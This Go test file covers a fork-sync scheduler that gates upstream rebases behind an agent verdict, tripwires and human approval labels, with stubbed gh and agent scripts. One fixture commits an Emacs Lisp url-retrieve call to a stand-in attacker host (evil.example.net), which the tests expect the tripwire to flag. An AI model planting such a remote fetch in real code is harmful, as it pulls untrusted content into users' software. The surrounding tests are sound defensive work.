package forkkeeper

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

type schedulerCase struct {
	fx       *testFixture
	binDir   string
	ghState  string
	config   string
	cacheDir string
	date     string
}

func newSchedulerCase(t *testing.T) *schedulerCase {
	t.Helper()
	fx := newTestFixture(t)
	binDir := filepath.Join(fx.root, "bin")
	if err := os.MkdirAll(binDir, 0o755); err != nil {
		t.Fatal(err)
	}
	ghState := filepath.Join(fx.root, "gh")
	if err := os.MkdirAll(ghState, 0o755); err != nil {
		t.Fatal(err)
	}

	stubGH := `#!/usr/bin/env bash
set -euo pipefail
s="$GH_STATE/prs.json"
[[ -f $s ]] || echo '[]' >"$s"
printf '%s\n' "$*" >>"$GH_STATE/calls"
G() { git --git-dir="$FAKE_ORIGIN" "$@"; }
upd() { jq "$@" "$s" >"$s.new" && mv "$s.new" "$s"; }
cmd="$1 $2"
shift 2
case $cmd in
"pr list")
	out='[]'
	for row in $(jq -c '.[]' "$s"); do
		head=$(G rev-parse -q --verify "refs/heads/$(jq -r .headRefName <<<"$row")") || continue
		G merge-base --is-ancestor "$head" refs/heads/main && continue
		out=$(jq -c --argjson r "$row" --arg h "$head" '. + [{
			number: $r.number, headRefName: $r.headRefName,
			url: "https://github.invalid/pull/\($r.number)",
			headRefOid: ($r.head_override // $h),
			labels: [$r.labels[] | {name: .}]}]' <<<"$out")
	done
	echo "$out"
	;;
"pr create")
	head="" body=""
	while [[ $# -gt 0 ]]; do
		case $1 in
		--head) head=$2; shift 2 ;;
		--body-file) body=$2; shift 2 ;;
		*) shift ;;
		esac
	done
	n=$(($(jq length "$s") + 1))
	upd --argjson n "$n" --arg h "$head" '. + [{number: $n, headRefName: $h, labels: []}]'
	cp "$body" "$GH_STATE/body.$n"
	if [[ -n ${FAKE_GH_ON_CREATE:-} ]]; then bash -c "$FAKE_GH_ON_CREATE"; fi
	echo "https://github.invalid/pull/$n"
	;;
"pr edit")
	sel=$1
	shift
	while [[ $# -gt 0 ]]; do
		case $1 in
		--add-label) upd --arg b "$sel" --arg l "$2" 'map(if .headRefName == $b then .labels = (.labels + [$l] | unique) else . end)' ;;
		--remove-label) upd --arg b "$sel" --arg l "$2" 'map(if .headRefName == $b then .labels -= [$l] else . end)' ;;
		--body-file) cp "$2" "$GH_STATE/body.$sel" 2>/dev/null || cp "$2" "$GH_STATE/body.edit" ;;
		esac
		shift 2
	done
	;;
"api --paginate"|"api repos"*)
	endpoint=""
	if [[ $cmd == "api --paginate" ]]; then
		endpoint=$1
	else
		endpoint=${cmd#api }
	fi
	pr_num=$(echo "$endpoint" | sed -E 's|.*/issues/([0-9]+)/timeline|\1|')
	if [[ -f "$GH_STATE/timeline.$pr_num" ]]; then
		cat "$GH_STATE/timeline.$pr_num"
	else
		has_app=$(jq -r --argjson n "$pr_num" '.[] | select(.number == $n) | .labels | index("fork-keeper:approved") != null' "$s")
		if [[ $has_app == "true" ]]; then
			echo '[{"event":"labeled","label":{"name":"fork-keeper:approved"}}]'
		else
			echo '[]'
		fi
	fi
	;;
*)
	echo "gh stub: unsupported: $cmd $*" >&2
	exit 1
	;;
esac
`
	//nolint:gosec // Test stub executable.
	if err := os.WriteFile(filepath.Join(binDir, "gh"), []byte(stubGH), 0o755); err != nil {
		t.Fatal(err)
	}

	fakeAgent := `#!/usr/bin/env bash
set -euo pipefail
out=""
while [[ $# -gt 0 ]]; do
	case $1 in
	--out) out=$2; shift 2 ;;
	*) shift ;;
	esac
done
echo run >>"$GH_STATE/agent.runs"
env >"$GH_STATE/agent.env"
git remote >"$GH_STATE/agent.remotes"
range=$(bash "$FAKE_RR" -b main)
git checkout -q -B fork-keeper/candidate "$(jq -r .upstream_new <<<"$range")"
for c in $(jq -r '.user_commits[]' <<<"$range"); do git cherry-pick "$c" >/dev/null; done
verdict=clean
case $FAKE_AGENT_MODE in
needs-review) verdict=needs-review ;;
lie) range=$(jq -c '.first_run = false | .rewritten = false | .moved_tags = [] | .deleted_tags = []' <<<"$range") ;;
none) exit 0 ;;
esac
jq -n --arg v "$verdict" --arg h "$(git rev-parse HEAD)" --argjson r "$range" \
	'{schema: 1, verdict: $v, candidate_head: $h, range: $r, conflicts: [], findings: [], summary: "stub"}' \
	>"$out/verdict.json"
echo "stub report ($verdict)" >"$out/report.md"
`
	//nolint:gosec // Test stub executable.
	if err := os.WriteFile(filepath.Join(binDir, "fake-agent"), []byte(fakeAgent), 0o755); err != nil {
		t.Fatal(err)
	}

	ensureTestPATH(t, binDir)
	t.Setenv("GH_STATE", ghState)
	t.Setenv("FAKE_ORIGIN", fx.originGit)
	t.Setenv("FAKE_RR", filepath.Join(fx.contractDir, "review-range.sh"))
	t.Setenv("GH_TOKEN", "secret-gh-token")

	cfg := Config{
		Forks: []Fork{{
			Name:        "demo",
			Repo:        "me/demo",
			ForkURL:     fx.originGit,
			UpstreamURL: fx.upstreamGit,
			Branch:      "main",
			Agent:       []string{"fake-agent", "sync", "--out", "{out}", "-b", "{branch}"},
		}},
	}
	cfgBytes, err := json.Marshal(cfg)
	if err != nil {
		t.Fatal(err)
	}
	cfgPath := filepath.Join(fx.root, "forks.json")
	if err := os.WriteFile(cfgPath, cfgBytes, 0o600); err != nil {
		t.Fatal(err)
	}

	return &schedulerCase{
		fx:       fx,
		binDir:   binDir,
		ghState:  ghState,
		config:   cfgPath,
		cacheDir: filepath.Join(fx.root, "cache"),
		date:     "2026-11-10",
	}
}

func (sc *schedulerCase) run(mode string) (string, error) {
	sc.fx.t.Helper()
	sc.fx.t.Setenv("FAKE_AGENT_MODE", mode)
	var out bytes.Buffer
	err := Run(context.Background(), Options{
		ConfigPath: sc.config,
		CacheDir:   sc.cacheDir,
		ScriptsDir: sc.fx.contractDir,
		Today:      sc.date,
		Sandbox:    "none",
		Stdout:     &out,
		Stderr:     &out,
	})
	return out.String(), err
}

func (sc *schedulerCase) agentRuns() int {
	data, err := os.ReadFile(filepath.Join(sc.ghState, "agent.runs"))
	if err != nil {
		return 0
	}
	lines := 0
	for _, l := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if l != "" {
			lines++
		}
	}
	return lines
}

type fakePRRecord struct {
	Number       int      `json:"number"`
	HeadRefName  string   `json:"headRefName"`
	Labels       []string `json:"labels"`
	HeadOverride string   `json:"head_override,omitempty"` //nolint:tagliatelle // Matches stub gh test fixture schema.
}

func (sc *schedulerCase) readPRs() []fakePRRecord {
	sc.fx.t.Helper()
	data, err := os.ReadFile(filepath.Join(sc.ghState, "prs.json"))
	if err != nil {
		return nil
	}
	var prs []fakePRRecord
	if err := json.Unmarshal(data, &prs); err != nil {
		sc.fx.t.Fatal(err)
	}
	return prs
}

func (sc *schedulerCase) writePRs(prs []fakePRRecord) {
	sc.fx.t.Helper()
	data, err := json.Marshal(prs)
	if err != nil {
		sc.fx.t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sc.ghState, "prs.json"), data, 0o600); err != nil {
		sc.fx.t.Fatal(err)
	}
}

func (sc *schedulerCase) hasLabel(prNum int, label string) bool {
	for _, p := range sc.readPRs() {
		if p.Number == prNum {
			for _, l := range p.Labels {
				if l == label {
					return true
				}
			}
		}
	}
	return false
}

func TestSchedulerUpToDate(t *testing.T) {
	sc := newSchedulerCase(t)
	sc.fx.recordHead(sc.fx.uref("refs/heads/main"))
	sc.fx.fcommit("mine.txt", "my patch")

	out, err := sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "up-to-date") {
		t.Fatalf("expected up-to-date in output: %s", out)
	}
	if sc.agentRuns() != 0 {
		t.Fatalf("agent must not run, ran %d times", sc.agentRuns())
	}
	calls, _ := os.ReadFile(filepath.Join(sc.ghState, "calls"))
	if strings.Contains(string(calls), "pr create") {
		t.Fatalf("expected no gh pr create calls, got %s", calls)
	}
}

func TestSchedulerCleanPromote(t *testing.T) {
	sc := newSchedulerCase(t)
	u0 := sc.fx.uref("refs/heads/main")
	sc.fx.recordHead(u0)
	sc.fx.mustRun("", "git", "--git-dir="+sc.fx.originGit, "update-ref", "refs/fork-keeper/upstream-tags/v0", u0)
	sc.fx.mustRun("", "git", "--git-dir="+sc.fx.upstreamGit, "update-ref", "refs/tags/v0", u0)
	oldMain := sc.fx.fcommit("mine.txt", "my patch")
	u1 := sc.fx.ucommit("README", "more docs")
	sc.fx.mustRun("", "git", "--git-dir="+sc.fx.upstreamGit, "update-ref", "refs/tags/v1", u1)

	out, err := sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	for _, want := range []string{
		"promoted",
		"opened https://github.invalid/pull/1",
		"promoted sync/" + sc.date + " https://github.invalid/pull/1 ",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("expected %q in output: %s", want, out)
		}
	}
	if len(sc.readPRs()) != 1 {
		t.Fatalf("expected 1 PR, got %d", len(sc.readPRs()))
	}
	if got := sc.fx.oref("refs/heads/sync/" + sc.date); got != "" {
		t.Fatalf("promoted sync branch should be cleaned up, got %s", got)
	}
	if got := sc.fx.oref("refs/fork-keeper/sync-base/sync/" + sc.date); got != "" {
		t.Fatalf("promoted sync-base ref should be cleaned up, got %s", got)
	}
	if got := sc.fx.oref("refs/fork-keeper/sync-tags/sync/" + sc.date + "/v1"); got != "" {
		t.Fatalf("promoted sync-tags ref should be cleaned up, got %s", got)
	}
	//nolint:gosec // Test fixture git command.
	if err := exec.Command("git", "--git-dir="+sc.fx.originGit, "merge-base", "--is-ancestor", u1, "refs/heads/main").Run(); err != nil {
		t.Fatalf("main not rebased onto upstream %s", u1)
	}
	if sc.fx.oref("refs/heads/main") == oldMain {
		t.Fatalf("main did not change")
	}
	if got := sc.fx.oref("refs/tags/pre-sync/" + sc.date); got != oldMain {
		t.Fatalf("pre-sync tag = %s, want %s", got, oldMain)
	}
	if got := sc.fx.oref("refs/fork-keeper/upstream-head"); got != u1 {
		t.Fatalf("upstream-head = %s, want %s", got, u1)
	}
	if got := sc.fx.oref("refs/fork-keeper/upstream-tags/v1"); got != u1 {
		t.Fatalf("tag mirror v1 = %s, want %s", got, u1)
	}
	if sc.hasLabel(1, "needs-review") {
		t.Fatalf("unexpected needs-review label")
	}
	agentEnv, _ := os.ReadFile(filepath.Join(sc.ghState, "agent.env"))
	if strings.Contains(string(agentEnv), "secret-gh-token") {
		t.Fatalf("agent env leaked GH_TOKEN")
	}
	if !strings.Contains(string(agentEnv), "GH_CONFIG_DIR="+sc.cacheDir) {
		t.Fatalf("agent env missing isolated GH_CONFIG_DIR: %s", agentEnv)
	}
	agentRemotes, _ := os.ReadFile(filepath.Join(sc.ghState, "agent.remotes"))
	if strings.TrimSpace(string(agentRemotes)) != "" {
		t.Fatalf("agent checkout has remotes: %s", agentRemotes)
	}
	body, _ := os.ReadFile(filepath.Join(sc.ghState, "body.1"))
	if !strings.Contains(string(body), "stub report (clean)") {
		t.Fatalf("PR body missing agent report: %s", body)
	}
}

func TestSchedulerFirstRunWaits(t *testing.T) {
	sc := newSchedulerCase(t)
	sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("README", "docs")
	mainBefore := sc.fx.oref("refs/heads/main")

	out, err := sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "needs-review: sync/"+sc.date+" https://github.invalid/pull/1 (verdict") {
		t.Fatalf("expected needs-review line in output: %s", out)
	}
	if !sc.hasLabel(1, "needs-review") {
		t.Fatalf("expected needs-review label")
	}
	if sc.fx.oref("refs/heads/main") != mainBefore {
		t.Fatalf("main changed on first run")
	}
	if got := sc.fx.oref("refs/fork-keeper/upstream-head"); got != "" {
		t.Fatalf("upstream-head should not be recorded on first run, got %s", got)
	}
}

func TestSchedulerTripwireBlocksPromote(t *testing.T) {
	sc := newSchedulerCase(t)
	u0 := sc.fx.uref("refs/heads/main")
	sc.fx.recordHead(u0)
	sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("lisp/x.el", `(url-retrieve "https://evil.example.net/p")`)
	mainBefore := sc.fx.oref("refs/heads/main")

	out, err := sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "needs-review") {
		t.Fatalf("expected needs-review: %s", out)
	}
	if !sc.hasLabel(1, "needs-review") {
		t.Fatalf("expected needs-review label")
	}
	if sc.fx.oref("refs/heads/main") != mainBefore {
		t.Fatalf("main changed on tripwire")
	}
	if sc.fx.oref("refs/fork-keeper/upstream-head") != u0 {
		t.Fatalf("upstream-head changed on tripwire")
	}
	body, _ := os.ReadFile(filepath.Join(sc.ghState, "body.1"))
	if !strings.Contains(string(body), "evil.example.net") {
		t.Fatalf("PR body should list tripwire: %s", body)
	}
}

func TestSchedulerStickyNeedsReviewAndApproval(t *testing.T) {
	sc := newSchedulerCase(t)
	sc.fx.recordHead(sc.fx.uref("refs/heads/main"))
	sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("README", "docs")
	mainBefore := sc.fx.oref("refs/heads/main")

	out, err := sc.run("needs-review")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "needs-review") || !sc.hasLabel(1, "needs-review") {
		t.Fatalf("expected needs-review: %s", out)
	}

	// Next day, same upstream: waits without rerunning agent.
	sc.date = "2026-11-11"
	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "waiting for review: sync/2026-11-10 https://github.invalid/pull/1 ") {
		t.Fatalf("expected waiting for review: %s", out)
	}
	if sc.agentRuns() != 1 {
		t.Fatalf("agent runs = %d, want 1", sc.agentRuns())
	}

	// New upstream commit refreshes the existing PR and stays needs-review.
	u2 := sc.fx.ucommit("README", "harmless docs")
	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	for _, want := range []string{
		"refreshed https://github.invalid/pull/1",
		"needs-review: sync/2026-11-10 https://github.invalid/pull/1 (verdict",
	} {
		if !strings.Contains(out, want) {
			t.Fatalf("expected %q in output: %s", want, out)
		}
	}
	if sc.agentRuns() != 2 || len(sc.readPRs()) != 1 {
		t.Fatalf("agentRuns=%d prs=%d", sc.agentRuns(), len(sc.readPRs()))
	}
	//nolint:gosec // Test fixture git command.
	if err := exec.Command("git", "--git-dir="+sc.fx.originGit, "merge-base", "--is-ancestor", u2, "refs/heads/sync/2026-11-10").Run(); err != nil {
		t.Fatalf("sync branch missing new upstream %s", u2)
	}
	if sc.fx.oref("refs/heads/main") != mainBefore || !sc.hasLabel(1, "needs-review") {
		t.Fatalf("expected main untouched and needs-review label preserved")
	}

	// Approval on stale head must not promote.
	prs := sc.readPRs()
	prs[0].Labels = append(prs[0].Labels, "fork-keeper:approved")
	prs[0].HeadOverride = "1111111111111111111111111111111111111111"
	sc.writePRs(prs)
	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "waiting for review") || sc.fx.oref("refs/heads/main") != mainBefore {
		t.Fatalf("stale approval must not promote: %s", out)
	}

	// Approval on matching head promotes without rerunning agent.
	prs = sc.readPRs()
	prs[0].HeadOverride = ""
	sc.writePRs(prs)
	prHead := sc.fx.oref("refs/heads/sync/2026-11-10")
	sc.date = "2026-11-12"
	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "promoted approved sync/2026-11-10 https://github.invalid/pull/1 ") {
		t.Fatalf("expected approved promotion log: %s", out)
	}
	if sc.fx.oref("refs/heads/main") != prHead {
		t.Fatalf("main = %s, want %s", sc.fx.oref("refs/heads/main"), prHead)
	}
	if sc.fx.oref("refs/tags/pre-sync/2026-11-12") != mainBefore {
		t.Fatalf("pre-sync tag mismatch")
	}
	if sc.fx.oref("refs/fork-keeper/upstream-head") != u2 {
		t.Fatalf("upstream-head mismatch")
	}
	if sc.agentRuns() != 2 {
		t.Fatalf("agent should not run on approval, runs=%d", sc.agentRuns())
	}
}

func TestSchedulerRewrittenUpstreamNeverPromotes(t *testing.T) {
	for _, mode := range []string{"clean", "lie"} {
		t.Run(mode, func(t *testing.T) {
			sc := newSchedulerCase(t)
			sc.fx.ucommit("README", "one")
			sc.fx.forkAtUpstream()
			sc.fx.recordHead(sc.fx.uref("refs/heads/main"))
			sc.fx.fcommit("mine.txt", "my patch")
			sc.fx.mustRun(sc.fx.useed, "git", "reset", "-q", "--hard", "HEAD~1")
			sc.fx.ucommit("README", "two")
			mainBefore := sc.fx.oref("refs/heads/main")

			out, err := sc.run(mode)
			if err != nil {
				t.Fatalf("unexpected error: %v\n%s", err, out)
			}
			if !strings.Contains(out, "needs-review") || !sc.hasLabel(1, "needs-review") {
				t.Fatalf("expected needs-review: %s", out)
			}
			if sc.fx.oref("refs/heads/main") != mainBefore {
				t.Fatalf("main changed on rewritten upstream")
			}
		})
	}
}

func TestSchedulerNoVerdictNeverPromotes(t *testing.T) {
	sc := newSchedulerCase(t)
	sc.fx.recordHead(sc.fx.uref("refs/heads/main"))
	sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("README", "docs")
	mainBefore := sc.fx.oref("refs/heads/main")

	out, err := sc.run("none")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "needs-review") {
		t.Fatalf("expected needs-review: %s", out)
	}
	if sc.fx.oref("refs/heads/main") != mainBefore {
		t.Fatalf("main changed without verdict")
	}
}

func TestSchedulerLeaseLostLeavesRefsUntouched(t *testing.T) {
	sc := newSchedulerCase(t)
	u0 := sc.fx.uref("refs/heads/main")
	sc.fx.recordHead(u0)
	sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("README", "docs")

	t.Setenv("FAKE_GH_ON_CREATE", "cd '"+sc.fx.fseed+"' && echo late >>late.txt && git add late.txt && git commit -q -m late && git push -q origin HEAD:main")
	out, err := sc.run("clean")
	if err == nil {
		t.Fatalf("expected error on lost lease, got nil\n%s", out)
	}
	if !strings.Contains(out, "force-push") {
		t.Fatalf("expected force-push in error output: %s", out)
	}
	if sc.fx.oref("refs/fork-keeper/upstream-head") != u0 {
		t.Fatalf("upstream-head changed on lost lease")
	}
}

func TestSchedulerSameDaySecondPromotion(t *testing.T) {
	sc := newSchedulerCase(t)
	sc.fx.recordHead(sc.fx.uref("refs/heads/main"))
	firstOldMain := sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("README", "first batch")

	out, err := sc.run("clean")
	if err != nil {
		t.Fatalf("first promote failed: %v\n%s", err, out)
	}
	secondOldMain := sc.fx.oref("refs/heads/main")
	if got := sc.fx.oref("refs/tags/pre-sync/" + sc.date); got != firstOldMain {
		t.Fatalf("first pre-sync tag = %s, want %s", got, firstOldMain)
	}

	u2 := sc.fx.ucommit("README", "second batch same day")
	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("second same-day promote failed: %v\n%s", err, out)
	}
	if got := sc.fx.oref("refs/tags/pre-sync/" + sc.date + ".2"); got != secondOldMain {
		t.Fatalf("second pre-sync tag = %s, want %s", got, secondOldMain)
	}
	if got := sc.fx.oref("refs/fork-keeper/upstream-head"); got != u2 {
		t.Fatalf("upstream-head = %s, want %s", got, u2)
	}
}

func TestSchedulerTimelineStaleApprovalBlocked(t *testing.T) {
	sc := newSchedulerCase(t)
	sc.fx.recordHead(sc.fx.uref("refs/heads/main"))
	sc.fx.fcommit("mine.txt", "my patch")
	sc.fx.ucommit("README", "docs")
	mainBefore := sc.fx.oref("refs/heads/main")

	out, err := sc.run("needs-review")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}

	// Simulate fork-keeper:approved added, then PR force-pushed afterward.
	prs := sc.readPRs()
	prs[0].Labels = append(prs[0].Labels, "fork-keeper:approved")
	sc.writePRs(prs)
	staleTimeline := `[{"event":"labeled","label":{"name":"fork-keeper:approved"}},{"event":"head_ref_force_pushed"}]`
	if err := os.WriteFile(filepath.Join(sc.ghState, "timeline.1"), []byte(staleTimeline), 0o600); err != nil {
		t.Fatal(err)
	}

	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if !strings.Contains(out, "changed after approval") || sc.fx.oref("refs/heads/main") != mainBefore {
		t.Fatalf("stale timeline approval must not promote: %s", out)
	}

	// Re-labeling after the force-push makes the approval current.
	freshTimeline := `[{"event":"labeled","label":{"name":"fork-keeper:approved"}},{"event":"head_ref_force_pushed"},{"event":"labeled","label":{"name":"fork-keeper:approved"}}]`
	if err := os.WriteFile(filepath.Join(sc.ghState, "timeline.1"), []byte(freshTimeline), 0o600); err != nil {
		t.Fatal(err)
	}
	prHead := sc.fx.oref("refs/heads/sync/" + sc.date)
	out, err = sc.run("clean")
	if err != nil {
		t.Fatalf("unexpected error: %v\n%s", err, out)
	}
	if sc.fx.oref("refs/heads/main") != prHead {
		t.Fatalf("expected promotion after fresh approval: %s", out)
	}
}
